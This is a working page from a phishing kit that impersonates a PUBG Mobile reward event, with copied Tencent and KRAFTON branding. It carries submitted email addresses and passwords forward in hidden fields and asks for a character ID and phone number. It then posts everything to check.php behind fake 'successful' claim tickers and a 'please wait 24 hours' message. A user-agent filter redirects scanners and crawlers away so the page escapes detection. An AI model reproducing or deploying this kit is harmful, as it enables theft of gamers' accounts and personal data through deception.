<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="A new version update is available!">
<meta name="description" content="The new version is now available with the return of the Ancient Secret!">
<meta property="og:description" content="The new version is now available with the return of the Ancient Secret!">
<meta property="og:url" content="../">
<meta property="og:site_name" content="A new version update is available!">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<title>A new version update is available!</title>
<link rel="stylesheet" href="../css/style.css">
<link rel="stylesheet" href="../css/animate.css">
<link rel="stylesheet" href="../css/login/facebook.css">
<link rel="stylesheet" href="../css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" type="img/png" href="https://www.pubgmobile.com/common/images/icon_logo.jpg" sizes="32x32">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
 body {
	background: #000 center / cover no-repeat;
	margin: 0;
	font-family: 'Teko';
}
.container {
	background: url(../img/container.jpg) no-repeat center center;
	background-size: cover;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
	border: 1px solid #131313;
}
.navbar-logo {
	width: 59px;
	float: left;
	margin-top: 11px;
	margin-left: 11px;
}
.event-theme {
	width: 95%;
	height: 75px;
	margin-top: -17px;
	margin-bottom: -12px;
	margin-left:auto;
	margin-right:auto;
	display:block;
}
.event-notification {
    background: url(../img/alert.jpg) no-repeat center;
	background-size: 100% 100%;
	width:90%;
	height:50px;
	padding:5px;
	padding-top:-15px;
	margin-right: auto;
	margin-left: auto;
}
.event-notification-text {
	padding-top:5px;
	text-align:center;
	font-family: Teko;
	color:#FBE900;
	font-size: 21px;
}
.footer {
	background: #131313;
	width: 100%;
	height: auto;
	padding: 15px;
}
.item img, .item button {
	border:1.5px solid #000;
}
.nav-popup-title {
    padding-left: 15px;
	padding-top: 2px;
	font-size: 22px;
	font-family:Teko;
	font-weight: 500;
	text-align: left;
	background: -webkit-linear-gradient(#ffffff, #f8f8ff);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.nav-popup img {
	width: 20px;
	height: 20px;
	margin-top: 5px;
	margin-right: 10px;
	color: #000;
	float: right;
}
.popup-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #ffffff;
	font-size: 20px;
    font-family:Teko;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-alert i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #ffffff;
	font-size: 40px;
	text-align: center;
}
.popup-footer button:nth-child(1) {
	width: auto;
	height: auto;
	margin-top: 4px;
	margin-left:auto;
	margin-right:auto;
	padding: 3px;
	padding-left: 28px;
	padding-right: 28px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-btn-login {
    width: 29%;
    height: auto;
    padding: 5px;
    margin: 2px;
    color: #000;
	font-size: 15px;
    font-family: Teko;
    border: none;
    outline: none;
    margin-bottom: 45px;
    position: relative;
    display: inline-block;
}
.popup-btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.popup-btn-facebook {
    background: #1778f2;
    color: #fff;
}
.popup-btn-twitter {
    background: #198B96;
    color: #fff;
}
.popup-btn-email {
    background: #D5AE49;
    color: #fff;
}
.popup-form-footer {
    margin-top: -16px;
}
.popup-form-footer button {
	width: auto;
	height: auto;
	margin-top: 4px;
	padding: 3px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-form input {
    background: none;
	background-size:100% 100%;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 4.4px;
	color: #fff;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border: 1px solid #fff;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-form input::placeholder {
	color: #fff;
}
.popup-form select {
    background: none;
	background-size:100% 100%;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 6px;
	color: #000;
	font-size: 17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border: 1px solid #000;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.input[type=text] {
  width: 90%;
  border-radius: 4px;
  resize: vertical;
  font-family:Teko;
}
.label {
  padding: 12px 12px 12px 0;
  display: inline-block;
}
.col-25 {
  float: left;
  width: 25%;
  margin-top: 7px;
  margin-right: -5px;
  font-family:Teko;
  color: #000;
  font-weight: 500;
  font-size: 15px;
}
.col-75 {
  float: left;
  width: 75%;
  margin-top: 7px;
  margin-left: -5px;
  font-family:Teko;
  color: #000;
  font-weight: 500;
}
.col-75 input::placeholder {
	color: #808080;
}
/* Clear floats after the columns */
.row:after {
  content: "";
  display: table;
  clear: both;
}
.notiftwitter {
	width: 30%;
	height: 30px;
	margin-left: 35%;
	margin-right: auto;
	padding: 5px;
	font-size: 22px;
	font-family:Teko;
	font-weight: 500;
	text-align: center;
	color: #ffbe21;
	margin-bottom: 0px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}
.twitter-content {
    margin-top: -30px;
}
</style>
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="../media/navbar-logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<video id="headerVideo" src="../media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="event-theme">
</div> <!--- event-theme --->
<div class="box">
<div class="event-notification">
<div class="event-notification-text">
<div class="slider animated fadeIn">!ID 6872374347 Successful Get Materials!</div>
<div class="slider animated fadeIn">!ID 559971979 Successful Get Materials!</div>
<div class="slider animated fadeIn">!ID 6646047475 Successful Get UC!</div>
<div class="slider animated fadeIn">!ID 589486613 Successful Get UC!</div>
<div class="slider animated fadeIn">!ID 6107017364 Successful Get UC!!</div>
<div class="slider animated fadeIn">!ID 5331782168 Successful Get UC!!</div>
<div class="slider animated fadeIn">!ID 5781364024 Successful Get UC!</div>
<div class="slider animated fadeIn">!ID 5781364024 Successful Get UC!</div>
<div class="slider animated fadeIn">!ID 5245426360 Successful Get Materials!</div>
<div class="slider animated fadeIn">!ID 5245426360 Successful Get Materials!</div>
<div class="slider animated fadeIn">!ID 526404630 Successful Get UC!</div>
<div class="slider animated fadeIn">!ID 6168621972 Successful Get UC!</div>
</div></div>
<center>
<div class="tab_rewards" id="latest">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="../img/rewards/jpeg.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="../img/rewards/jpeg.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="../img/rewards/6.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="../img/rewards/6.jpg">Collect</button>
</div>
</div>
</center>
</div> <!--- box --->
<div class="footer">
<div class="footer-txt-join"></div>
<div class="footer-txt-join">Join the Community</div> <!--- footer-txt-follow --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="../media/footer-socmed-1.png">
<p>Facebook</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-other" src="../media/footer-socmed-2.png">
<p>Twitter</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Subscribe</button>
<img class="footer-socmed-img-other" src="../media/footer-socmed-3.png">
<p>Youtube</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-main" src="../media/footer-socmed-4.png">
<p>Instagram</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="../media/footer-socmed-5.png">
<p>VK</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Join</button>
<img class="footer-socmed-img-other" src="../media/footer-socmed-6.png">
<p>Discord</p>
</div> <!--- footer-socmed-box --->
<img class="footer-copyright-icon" src="../media/footer-img.png">
<div class="footer-txt-copyright">ⓒ 2022 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-2022 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
<br>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="../img/popup-close.png">
<div class="nav-popup-title">Reward Confirmation</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Are you sure to collect this reward?</div> <!--- popup-alert --->
<div class="popup-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="buka.play();" onclick="open_verification()">Collect</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup account_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Complete your account details</div> <!--- popup-alert --->
<form class="popup-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
<input type="number" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Character ID')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')">
<br><br>
</div> <!--- popup-box-bg --->
<div class="popup-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify</button>
</div> <!--- popup-footer --->
</form> <!--- form --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup check_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
<br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
<br><br>
</div> <!--- popup-alert --->
<div class="popup-form-footer">
</div> <!--- popup-form-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Processing Account</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert"><br>
Thank you for joining this event
<br>
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div><br>
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(../img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://www.pubgmobile.com/';">Logout</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="../js/script.js"></script>
<script src="../js/showHide.js"></script>
<script src="../js/Nizam.js"></script>
<script>
function close_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function close_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}
function open_verification(){
	$('.account_verification').show()
	$('.itemReward_confirmation').hide();
}
// code for showing countdown timer
$(document).ready(function() {
    var detik = 59;
    var menit = 59;
    var jam = 23;
	
    function hitung() {
		setTimeout(hitung, 1000);
        $('#latestTimer').html('' + jam + ' : ' + menit + ' : ' + detik + '');
        detik--;
        if (detik < 0) {
            detik = 59;
            menit--;
            if (menit < 0) {
                menit = 0;
                detik = 0;
            }
        }
    }
    hitung();
});
var slideIndexHeader = 0;
showSlidesHeader();
function showSlidesHeader() {
    var i;
    var slidesHeader = document.getElementsByClassName("sliderHeader");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
    }
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 2500);
}
var slideIndexHeader = 0;
showSlidesHeader();
function showSlidesHeader() {
    var i;
    var slidesHeader = document.getElementsByClassName("slider");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
    }
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 2500);
}
// code for activate clicked sound
var buka = new Audio();
buka.src = "../media/open_reward_tab.mp3";

var tutup = new Audio();
tutup.src = "../media/close_reward_tab.mp3";

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup
function open_rewardsBox(){
	$('.rewardsBox').show();
	$('.rewardsHome').hide();
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_account_login(){
	$('.account_login').show();
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}
function close_reward_confirmation(){
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}

// code for validate data to next step
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$email = $('#email-facebook').val().trim();
	$password = $('#password-facebook').val().trim();
	$login = $('#login-facebook').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-facebook').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}
function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$email = $('#email-twitter').val().trim();
	$password = $('#password-twitter').val().trim();
	$login = $('#login-twitter').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-twitter').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}
function ValidateLoginEmailData() {
	$('#ValidateLoginEmailForm').submit(function(submitingValidateLoginEmailData){
	submitingValidateLoginEmailData.preventDefault();
	
	$email = $('#email-link').val().trim();
	$password = $('#password-link').val().trim();
	$login = $('#login-link').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-link').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}

// code for validate data to sending to file result
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $nick = $("input#nick").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $tier = $("input#tier").val();
	var $rpt = $("input#rpt").val();
	var $rpl = $("input#rpl").val();
	var $platform = $("input#platform").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "../check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
			$('.email_login').hide();
		},
		success: function(){
		$(".processing_account").show();
		$('.check_verification').hide();
		$('.account_verification').hide();
		$('.email_login').hide();
		}
	});
	});  
	return false;
};
</script>
</body>
</html>